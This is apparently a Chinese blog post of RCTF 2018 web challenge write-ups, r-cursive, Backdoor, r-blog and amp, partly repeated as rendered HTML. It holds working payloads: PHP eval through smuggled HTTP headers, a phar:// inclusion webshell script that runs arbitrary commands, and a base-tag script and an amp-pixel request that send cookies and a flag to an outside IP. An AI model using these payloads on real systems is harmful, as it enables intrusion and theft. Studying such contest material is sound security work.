1337</address>\n</body></html>\n```\n\n报错，403，这是由于sandbox目录下只有init.php，没有index.php的缘故。我们访问init.php试试，200,没有报错。说明open_basedir已经发生变化。\n\n```\nGET /init.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:26:20 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 0\nConnection: close\nContent-Type: text/html; charset=UTF-8      \n```\n\ngetflag:\n\n```\nGET /71aabdeb3d708872c6e00e066ae48b2669834df7/index.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');var_dump(file_get_contents(\"/var/www/sandbox/init.php\"));\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 06:51:10 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nVary: Accept-Encoding\nContent-Length: 186\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/:/tmp/string(148) \"<?php\n    ini_set(\"open_basedir\", $_SERVER['DOCUMENT_ROOT'].\"/:/tmp/\");\n    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}\n?>\n\"\n```\n\n## Backdoor\n\n![1526992722365](/images/rctf/1526992722365.png)\n\n根据contrab.sh,我们可以得到两个链接：\n\n> http://backdoor.2018.teamrois.cn/post.php?action=upload\n>\n> http://backdoor.2018.teamrois.cn/post.php?action=debugging&count=$debuggers\n\n打开首页，查看源码，得到aaencode之后的js代码:\n\n解密网址:`https://tool.zcmzcm.org/aadecode`\n\n```\ndocument.loginform.onsubmit = function (e) { \n\te.preventDefault()\n\tdocument.getElementById('wp-submit').disabled = 'disabled'\n\tsetTimeout(function () {\n\t\tdocument.getElementById('wp-submit').removeAttribute('disabled')\n\t\talert('Login failed')\n\t\t\"What? Need hint?\"\n\t\t\"index.php is a hint!\"\n\t}, 3000)\n}\n```\n\n说明，不用登录。\n\n查看post.php，发现可能存在LFI。\n\nindex.php,没啥用\n\n> http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index\n\npost.php\n\n```\n<?php\nerror_reporting(0);\ninclude $_GET['action'] . '.php';\n```\n\nuploa.php\n\n```\n<?php\nif (!isset($_FILES['file'])) exit;\n$file = $_FILES['file'];\n$zip = new ZipArchive();\nif (true !== $zip->open($file['tmp_name'])) {\n\techo 'No a valid zip';\n\texit;\n}\nif (false === $zip->getFromName('tmp/random.txt')) {\n\techo 'No file';\n\texit;\n}\n\n$dest = 'uploads/' . md5($_SERVER['REMOTE_ADDR']) . hash('sha256', file_get_contents($file['tmp_name'])) . '.zip';\nmove_uploaded_file($file['tmp_name'], $dest);\necho 'Saved into ' . $dest;\n```\n\n利用zip://或者phar://包含。\n\n```python\nimport requests\n\ns = \"Saved into \"\npost_url = \"http://backdoor.2018.teamrois.cn/post.php?action=upload\"\nzip_file = open(\"tmp.zip\",\"rb\")\nupload_file = {'file':zip_file}\nr = requests.post(post_url,files=upload_file)\ndest = r.text[len(s):]\nshell_url = \"http://backdoor.2018.teamrois.cn/post.php?action=phar://\"+ dest + \"/evil\"\nprint(\"[*] shell url: \" + shell_url)\nwhile  True:\n    command = input(\"command: \")\n    payload = {'chybeta': 'system(\"%s\");' % command}\n    r = requests.get(shell_url,params=payload)\n    print(r.text)\n```\n\n## r-blog\n\ntitle:        \"<>1\"\n\ncontent: \"<>1\"\n\n结果：\n\n```\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"utf-8\">\n\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n\t<link rel=\"stylesheet\" href=\"/assets/css/bootstrap.min.css\">\n\t<link rel=\"stylesheet\" href=\"/assets/css/style.css\">\n\t<link href=\"https://fonts.googleapis.com/css?family=Titillium+Web\" rel=\"stylesheet\">\n\t<title>rBlog 2018</title>\n</head>\n<body>\n<div class=\"container mt-5\">\n\t<div class=\"card\">\n\t\t\t\t<div class=\"card-body\">\n\t\t\t<h2 class=\"card-title\"><>1</h2>\n\t\t\t<p class=\"card-text\">&lt;&gt;2</p>\n\t\t</div>\n\t</div>\n</div>\n<script nonce=\"090c154a21d0fdf5809aff4586fe1eed\" src=\"/assets/js/jquery.min.js\"></script>\n</body>\n</html>\n```\n\ntitle没有过滤，content过滤。\n\ncsp如下:\n\n```\nX-Frame-Options: DENY\nContent-Security-Policy: default-src 'none'; script-src 'nonce-3ae08923a2654e27a3734f7876a5abe0'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'\n```\n\n我们看到jquery.min.js是相对地址，并且base-uri没有在csp中指定。\n\n所以payload如下:\n\ntitle: `<base href =\"http://【my_server】/\">`\n\ncontent: 随意\n\n在字节的vps上添加jquery.min.js，网址:           `http://[my_server]/assets/js/jquery.min.js`\n\njquery.min.js的内容：\n\n```\nwindow.location.href=\"http://123.207.90.143?\"+document.cookie;\n```\n\n最终结果:\n\n```\n115.159.200.107 - - [22/May/2018:21:39:02 +0800] \"GET /?flag=RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012};%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1\" 200 15 \"http://rblog.2018.teamrois.cn/\" \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36\"\n\n```\n\n## amp\n\npayload:\n\n> http://amp.2018.teamrois.cn?name=<amp-pixel src=\"https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)\"></amp-pixel>\n\n```\n[root@VM_89_224_redhat ~]# nc -lvv 1234\nNcat: Version 6.40 ( http://nmap.org/ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from 106.120.206.166.\nNcat: Connection from 106.120.206.166:64053.\n\u0016\u0003\u0001\u0002\u0001\u0001�\u0003\u0003�Y���8۲Y�=����6���km����\n                                 ��A It+z���^�vY�$���,�\u00183�'�����*K�Zp\"jj\u0013\u0001\u0013\u0002\u0013\u0003�+�/�,�0̨̩�\u0013�\u0014��/5\n\u0014\u0012\u0004\u0004\u0004\u0001\u0006\u0006\u0001\u0002\u0001\u0001\u0012\u0010\n              \u0002hhttp/1.1uP\n                          \u0002\u00013+)jj\u0001\u001d �ZaV>WB�~\u0013���|�Z��4KM�������Et~-\u0002\u0001\u0001+\n\n��\u0017\u0003\u0003\u0003\u0002\u0003\u0001\n\n```\n\nwriteup:\n\n>  https://github.com/zsxsoft/my-rctf-2018/tree/master/amp\n\n注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。\n\n\n\n","slug":"rctf2018学习笔记","published":1,"updated":"2018-07-23T12:35:12.016Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12i3001cqkdl50w3zrke","content":"<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><a id=\"more\"></a>\n<p>赛后总结</p>\n<h2 id=\"r-cursive\"><a href=\"#r-cursive\" class=\"headerlink\" title=\"r-cursive\"></a>r-cursive</h2><p>源代码:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$token = sha1($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class=\"line\">$dir = &apos;../sandbox/&apos;.$token.&apos;/&apos;;</span><br><span class=\"line\">is_dir($dir) ?: mkdir($dir);</span><br><span class=\"line\">is_file($dir.&apos;index.php&apos;) ?: file_put_contents($dir.&apos;index.php&apos;, str_replace(&apos;#SHA1#&apos;, $token, file_get_contents(&apos;./template&apos;)));</span><br><span class=\"line\">switch($_GET[&apos;action&apos;] ?: &apos;&apos;)&#123;</span><br><span class=\"line\">    case &apos;go&apos;:</span><br><span class=\"line\">        header(&apos;Location: http://&apos;.$token.&apos;.sandbox.r-cursive.ml:1337/&apos;);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case &apos;reset&apos;:</span><br><span class=\"line\">        system(&apos;rm -rf &apos;.$dir);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    default:</span><br><span class=\"line\">        show_source(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;style&gt;code&#123;font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p>template:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">sha1($_SERVER[&apos;REMOTE_ADDR&apos;]) === &apos;#SHA1#&apos; ?: die();</span><br><span class=\"line\">&apos;;&apos; === preg_replace(&apos;/[^\\W_]+\\((?R)?\\)/&apos;, NULL, $_GET[&apos;cmd&apos;]) ? eval($_GET[&apos;cmd&apos;]) : show_source(__FILE__);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/\" target=\"_blank\" rel=\"noopener\">http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/</a>:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">sha1($_SERVER[&apos;REMOTE_ADDR&apos;]) === &apos;589bf872527b686d94b4448c8ea3aed4761eaddc&apos; ?: die();</span><br><span class=\"line\">&apos;;&apos; === preg_replace(&apos;/[^\\W_]+\\((?R)?\\)/&apos;, NULL, $_GET[&apos;cmd&apos;]) ? eval($_GET[&apos;cmd&apos;]) : show_source(__FILE__);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class=\"line\">?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class=\"line\">?cmd=print(dirname(dirname(getcwd()))); print出/var/www</span><br></pre></td></tr></table></figure>\n<p>翻阅文档找到<code>getallheaders()</code>函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了<br>?cmd=print(end(getallheaders()));</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: 589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml</span><br><span class=\"line\">cmd: phpinfo(); //</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/rctf/1526973311681.png\" alt=\"1526973311681\"></p>\n<p>这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You can use auto_prepend option in php.ini to supply script that will be executed first. There you can setup open_basedir via ini_set() function based on contents of $_SERVER array.</span><br><span class=\"line\">answered May 10 &apos;13 at 17:21</span><br><span class=\"line\">gmsalex</span><br><span class=\"line\">20816</span><br><span class=\"line\">Yeah, something like this could do it: ini_set(&apos;open_basedir&apos;,&quot;/var/www/hosts/$hostname/:/tmp/&quot;); – Sunry Feb 9 at 1:29</span><br></pre></td></tr></table></figure>\n<p>不修改host:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /?cmd=eval(end(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: 71aabdeb3d708872c6e00e066ae48b2669834df7.sandbox.r-cursive.ml:1337</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">cookie: echo ini_get(&apos;open_basedir&apos;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Tue, 22 May 2018 07:25:09 GMT</span><br><span class=\"line\">Server: Apache/2.4.10 (Debian)</span><br><span class=\"line\">X-Powered-By: PHP/5.6.36</span><br><span class=\"line\">Content-Length: 64</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">/var/www/sandbox/71aabdeb3d708872c6e00e066ae48b2669834df7/:/tmp/</span><br></pre></td></tr></table></figure>\n<p>修改host:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /?cmd=eval(end(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: .sandbox.r-cursive.ml:1337</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">cookie: echo ini_get(&apos;open_basedir&apos;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 403 Forbidden</span><br><span class=\"line\">Date: Tue, 22 May 2018 07:25:36 GMT</span><br><span class=\"line\">Server: Apache/2.4.10 (Debian)</span><br><span class=\"line\">Content-Length: 298</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=iso-8859-1</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class=\"line\">&lt;html&gt;&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class=\"line\">&lt;p&gt;You don&apos;t have permission to access /</span><br><span class=\"line\">on this server.&lt;br /&gt;</span><br><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\">&lt;hr&gt;</span><br><span class=\"line\">&lt;address&gt;Apache/2.4.10 (Debian) Server at .sandbox.r-cursive.ml Port 1337&lt;/address&gt;</span><br><span class=\"line\">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>报错，403，这是由于sandbox目录下只有init.php，没有index.php的缘故。我们访问init.php试试，200,没有报错。说明open_basedir已经发生变化。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /init.php?cmd=eval(end(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: .sandbox.r-cursive.ml:1337</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">cookie: echo ini_get(&apos;open_basedir&apos;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Tue, 22 May 2018 07:26:20 GMT</span><br><span class=\"line\">Server: Apache/2.4.10 (Debian)</span><br><span class=\"line\">X-Powered-By: PHP/5.6.36</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>\n<p>getflag:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /71aabdeb3d708872c6e00e066ae48b2669834df7/index.php?cmd=eval(end(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: .sandbox.r-cursive.ml:1337</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">cookie: echo ini_get(&apos;open_basedir&apos;);var_dump(file_get_contents(&quot;/var/www/sandbox/init.php&quot;));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Tue, 22 May 2018 06:51:10 GMT</span><br><span class=\"line\">Server: Apache/2.4.10 (Debian)</span><br><span class=\"line\">X-Powered-By: PHP/5.6.36</span><br><span class=\"line\">Vary: Accept-Encoding</span><br><span class=\"line\">Content-Length: 186</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">/var/www/sandbox/:/tmp/string(148) &quot;&lt;?php</span><br><span class=\"line\">    ini_set(&quot;open_basedir&quot;, $_SERVER[&apos;DOCUMENT_ROOT&apos;].&quot;/:/tmp/&quot;);</span><br><span class=\"line\">    // flag: RCTF&#123;apache_mod_vhost_alias_should_be_configured_correctly&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Backdoor\"><a href=\"#Backdoor\" class=\"headerlink\" title=\"Backdoor\"></a>Backdoor</h2><p><img src=\"/images/rctf/1526992722365.png\" alt=\"1526992722365\"></p>\n<p>根据contrab.sh,我们可以得到两个链接：</p>\n<blockquote>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=upload\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=upload</a></p>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers</a></p>\n</blockquote>\n<p>打开首页，查看源码，得到aaencode之后的js代码:</p>\n<p>解密网址:<code>https://tool.zcmzcm.org/aadecode</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.loginform.onsubmit = function (e) &#123; </span><br><span class=\"line\">\te.preventDefault()</span><br><span class=\"line\">\tdocument.getElementById(&apos;wp-submit&apos;).disabled = &apos;disabled&apos;</span><br><span class=\"line\">\tsetTimeout(function () &#123;</span><br><span class=\"line\">\t\tdocument.getElementById(&apos;wp-submit&apos;).removeAttribute(&apos;disabled&apos;)</span><br><span class=\"line\">\t\talert(&apos;Login failed&apos;)</span><br><span class=\"line\">\t\t&quot;What? Need hint?&quot;</span><br><span class=\"line\">\t\t&quot;index.php is a hint!&quot;</span><br><span class=\"line\">\t&#125;, 3000)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>说明，不用登录。</p>\n<p>查看post.php，发现可能存在LFI。</p>\n<p>index.php,没啥用</p>\n<blockquote>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index</a></p>\n</blockquote>\n<p>post.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include $_GET[&apos;action&apos;] . &apos;.php&apos;;</span><br></pre></td></tr></table></figure>\n<p>uploa.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if (!isset($_FILES[&apos;file&apos;])) exit;</span><br><span class=\"line\">$file = $_FILES[&apos;file&apos;];</span><br><span class=\"line\">$zip = new ZipArchive();</span><br><span class=\"line\">if (true !== $zip-&gt;open($file[&apos;tmp_name&apos;])) &#123;</span><br><span class=\"line\">\techo &apos;No a valid zip&apos;;</span><br><span class=\"line\">\texit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if (false === $zip-&gt;getFromName(&apos;tmp/random.txt&apos;)) &#123;</span><br><span class=\"line\">\techo &apos;No file&apos;;</span><br><span class=\"line\">\texit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$dest = &apos;uploads/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]) . hash(&apos;sha256&apos;, file_get_contents($file[&apos;tmp_name&apos;])) . &apos;.zip&apos;;</span><br><span class=\"line\">move_uploaded_file($file[&apos;tmp_name&apos;], $dest);</span><br><span class=\"line\">echo &apos;Saved into &apos; . $dest;</span><br></pre></td></tr></table></figure>\n<p>利用zip://或者phar://包含。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">s = <span class=\"string\">\"Saved into \"</span></span><br><span class=\"line\">post_url = <span class=\"string\">\"http://backdoor.2018.teamrois.cn/post.php?action=upload\"</span></span><br><span class=\"line\">zip_file = open(<span class=\"string\">\"tmp.zip\"</span>,<span class=\"string\">\"rb\"</span>)</span><br><span class=\"line\">upload_file = &#123;<span class=\"string\">'file'</span>:zip_file&#125;</span><br><span class=\"line\">r = requests.post(post_url,files=upload_file)</span><br><span class=\"line\">dest = r.text[len(s):]</span><br><span class=\"line\">shell_url = <span class=\"string\">\"http://backdoor.2018.teamrois.cn/post.php?action=phar://\"</span>+ dest + <span class=\"string\">\"/evil\"</span></span><br><span class=\"line\">print(<span class=\"string\">\"[*] shell url: \"</span> + shell_url)</span><br><span class=\"line\"><span class=\"keyword\">while</span>  <span class=\"keyword\">True</span>:</span><br><span class=\"line\">    command = input(<span class=\"string\">\"command: \"</span>)</span><br><span class=\"line\">    payload = &#123;<span class=\"string\">'chybeta'</span>: <span class=\"string\">'system(\"%s\");'</span> % command&#125;</span><br><span class=\"line\">    r = requests.get(shell_url,params=payload)</span><br><span class=\"line\">    print(r.text)</span><br></pre></td></tr></table></figure>\n<h2 id=\"r-blog\"><a href=\"#r-blog\" class=\"headerlink\" title=\"r-blog\"></a>r-blog</h2><p>title:        “&lt;&gt;1”</p>\n<p>content: “&lt;&gt;1”</p>\n<p>结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 